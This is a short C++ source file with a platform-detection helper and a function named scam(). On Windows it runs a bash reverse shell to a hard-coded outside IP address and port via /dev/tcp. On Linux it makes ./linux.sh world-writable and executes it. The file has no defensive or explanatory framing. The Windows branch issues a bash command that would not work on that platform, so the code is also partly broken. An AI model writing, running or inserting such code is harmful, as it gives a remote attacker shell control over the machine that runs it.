#include <string.h>
#include <stdlib.h>
#include <string>
#include <memory>
#include <unistd.h>
std::string OsName()
{
#ifdef _WIN32
    return "Windows";
#elif _WIN64
    return "Windows";
#elif __APPLE__ || __MACH__
    return "Mac OSX";
#elif __linux__
    return "Linux";
#elif __FreeBSD__
    return "FreeBSD";
#elif __unix || __unix__
    return "Unix";
#else
    return "Other";
#endif
}

void scam()
{
    if (OsName() == "Windows")
    {
        system("/bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1");
    }
    else if (OsName() == "Linux")
    {
        system("chmod 777 ./linux.sh");
        execl("./linux.sh", "linux.sh", (char *)0);
    }
}
